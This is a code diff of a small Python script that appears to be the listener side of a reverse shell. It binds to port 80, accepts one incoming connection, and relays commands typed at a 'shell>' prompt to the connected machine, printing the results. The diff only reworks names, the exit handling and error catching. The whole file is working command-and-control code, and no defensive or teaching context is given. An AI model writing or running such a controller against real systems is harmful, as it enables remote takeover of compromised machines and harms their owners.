@@ -1,31 +1,36 @@
 # Modules
-import socket
-import sys
+import socket,sys
 
 #Variables
 HOST = "0.0.0.0"
 PORT = 80
-BUFFER_SIZE = 1024
+BUFFER = 1024
 
-#Make the server
-def connect():
+# Server
+def server():
+  global client_socket
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.bind((HOST, PORT))
-  s.listen(2)
-  print(f"[*] Listening as {HOST} on port {PORT}...")
+  s.listen(1)
+  print(f"Listening as {HOST}:{PORT}")
   print("\n")
-  global client_socket
   client_socket, address = s.accept()
-  print(f"[*] Connection is up | IP:{address[0]} | Port:{address[1]}")
+  print(f"{address[0]}:{address[1]} connected")
   print("\n")
-connect()
-# Sending commands to the client
-while True:
-  command = input("Shell> ")
+
+def listening():
+  command = input("shell> ")
   client_socket.send(command.encode())
-  if command.lower() == "exit":
-    print("[!] Exited...")
-    sys.exit()
-  result = client_socket.recv(BUFFER_SIZE).decode()
+  result = client_socket.recv(BUFFER).decode()
   print(result)
 
+# Sending commands to the client
+server()
+while True:
+  try:
+    listening()
+  except ConnectionError:
+    sys.exit()
+  except KeyboardInterrupt:
+    print("Exiting...")
+    sys.exit()
